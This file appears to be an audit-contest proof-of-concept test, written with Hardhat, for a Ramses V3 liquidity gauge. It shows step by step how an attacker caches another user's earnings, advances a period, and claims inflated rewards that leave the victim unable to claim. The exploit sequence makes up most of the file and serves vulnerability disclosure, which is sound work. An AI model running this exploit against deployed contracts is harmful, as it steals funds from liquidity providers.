import { ethers } from "hardhat";
import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { testFixture } from "../../../scripts/deployment/testFixture";
import { expect } from "../uniswapV3CoreTests/shared/expect";
import * as helpers from "@nomicfoundation/hardhat-network-helpers";
import { createPoolFunctions } from "../uniswapV3CoreTests/shared/utilities";

const testStartTimestamp = Math.floor(new Date("2030-01-01").valueOf() / 1000);

describe("Code4rena Contest", () => {
    let c: Awaited<ReturnType<typeof auditTestFixture>>;
    let wallet: HardhatEthersSigner;
    let attacker: HardhatEthersSigner;
    const fixture = testFixture;

    async function auditTestFixture() {
        const suite = await loadFixture(fixture);
        [wallet, attacker] = await ethers.getSigners();

        const pool = suite.clPool;

        const swapTarget = await (
            await ethers.getContractFactory(
                "contracts/CL/core/test/TestRamsesV3Callee.sol:TestRamsesV3Callee",
            )
        ).deploy();

        const {
            swapToLowerPrice,
            swapToHigherPrice,
            swapExact0For1,
            swap0ForExact1,
            swapExact1For0,
            swap1ForExact0,
            mint,
            flash,
        } = createPoolFunctions({
            token0: suite.usdc,
            token1: suite.usdt,
            swapTarget: swapTarget,
            pool,
        });

        return {
            ...suite,
            pool,
            swapTarget,
            swapToLowerPrice,
            swapToHigherPrice,
            swapExact0For1,
            swap0ForExact1,
            swapExact1For0,
            swap1ForExact0,
            mint,
            flash,
        };
    }

    describe("Proof of concepts", () => {

        beforeEach("setup", async () => {
            c = await loadFixture(auditTestFixture);
            [wallet, attacker] = await ethers.getSigners();
        });

        it("Inflated multi-week gauge rewards", async () => {

            console.log("-------------------- START --------------------");

            const startPeriod: number = Math.floor(testStartTimestamp / 604800) + 1;
            const startPeriodTime = startPeriod * 604800;
            const secondPeriodTime: number = (startPeriod + 1) * 604800;
            const thirdPeriodTime: number = (startPeriod + 2) * 604800;

            // Begin at the very start of a period
            await helpers.time.increaseTo(startPeriodTime);
            console.log("Liquidity start", await c.pool.liquidity());
            console.log("Tick start", (await c.pool.slot0()).tick);

            // Begin by minting two positions, both with 100 liquidity in the same range
            await c.mint(wallet.address, 0n, -10, 10, 100n)
            await c.mint(attacker.address, 0n, -10, 10, 100n)
            console.log("Liquidity after", await c.pool.liquidity());

            // Also add 10 tokens as a gauge reward for this period
            await c.usdc.approve(c.clGauge, ethers.MaxUint256);
            await c.clGauge.notifyRewardAmount(c.usdc, ethers.parseEther("10"))   

            // Increase to the next period
            await helpers.time.increaseTo(secondPeriodTime);

            // See how much the two positions have earned, should be basically 50 USDC each
            const walletEarned1 = await c.clGauge.periodEarned(startPeriod, c.usdc, wallet.address, 0, -10, 10);
            const attackerEarned1 = await c.clGauge.periodEarned(startPeriod, c.usdc, attacker.address, 0, -10, 10);
            const tokenTotalSupplyByPeriod = await c.clGauge.tokenTotalSupplyByPeriod(startPeriod, c.usdc);

            console.log("walletEarned1", walletEarned1);
            console.log("attackerEarned1", attackerEarned1);
            console.log("tokenTotalSupplyByPeriod", tokenTotalSupplyByPeriod);

            // Notice that anyone can cache the "wallet" address earned amount. This will "lock in" that
            // the wallet address has earned ~50 USDC.
            await c.clGauge.cachePeriodEarned(startPeriod, c.usdc, wallet.address, 0, -10, 10, true);

            // Now if a whole period goes by, the "endSecondsPerLiquidityPeriodX128" for the startPeriod will be
            // set too far in the future, and the attacker will end up getting double the rewards they should.
            await helpers.time.increaseTo(thirdPeriodTime);
            await c.clPool._advancePeriod();

            const attackerEarned2 = await c.clGauge.periodEarned(startPeriod, c.usdc, attacker.address, 0, -10, 10);
            console.log("attackerEarned2", attackerEarned2);
            const attackerBalanceBefore = await c.usdc.balanceOf(attacker.address);
            await c.clGauge.connect(attacker).getPeriodReward(startPeriod, [c.usdc], attacker.address, 0, -10, 10, attacker.address);
            const attackerBalanceAfter = await c.usdc.balanceOf(attacker.address);
            console.log("attacker claim amount", attackerBalanceAfter - attackerBalanceBefore);

            // This is all at the expense of the wallet address, because they had their rewards "locked in" and 
            // can't benefit from the bug, and moreover will not be able to claim anything because the attacker
            // took all the tokens
            const walletEarned2 = await c.clGauge.periodEarned(startPeriod, c.usdc, wallet.address, 0, -10, 10);
            console.log("walletEarned2", walletEarned2);
            await expect(
                c.clGauge.connect(wallet).getPeriodReward(startPeriod, [c.usdc], wallet.address, 0, -10, 10, wallet.address)
            ).to.be.revertedWithCustomError(c.usdc, 'ERC20InsufficientBalance');

            console.log("-------------------- END --------------------");
        });
    });
});